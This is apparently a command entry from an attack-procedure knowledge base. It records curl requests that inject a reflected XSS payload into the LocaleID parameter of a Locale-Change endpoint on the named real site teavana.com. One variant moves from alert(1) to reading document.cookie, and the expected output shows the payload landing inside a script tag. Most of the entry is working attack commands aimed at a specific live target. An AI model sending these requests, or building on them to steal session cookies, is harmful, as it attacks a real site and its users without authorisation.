---
id: 9d54c460-48a4-4d2d-95fb-f4438d21eea1
name: send-xss-payload-to-locale-change-endpoint
type: command
executor: bash
data: >-
  curl -X GET
  "https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA"
  -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.728Z'
platforms:
  - Web
tags:
  - xss
  - http-request
verified: false
validated: true
submitted: true
---

# send-xss-payload-to-locale-change-endpoint

## Command

```bash
curl -X GET "https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA" -v
```

## Description

This command sends a GET request to the Locale-Change endpoint on teavana.com with a reflected XSS payload in the LocaleID parameter, demonstrating injection before the '_CA' suffix to break out of a JavaScript string.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `URL` | Target endpoint with payload in LocaleID | Yes |
| `-v` | Verbose output to show request/response details | No |
| `LocaleID` | Parameter value: eas%27;alert(1);//dasdsan_CA (injects ';alert(1);//) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(document.cookie);//dasdsan_CA" -H "Cookie: session=abc123" -v
```

## Expected Output

HTTP/1.1 200 OK response with body containing reflected payload in a script tag, e.g., var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';. No alert here, but execution on browser visit.

## Related

- [[Related Procedure|procedures/Inject-XSS-Payload-into-LocaleID-Parameter]]
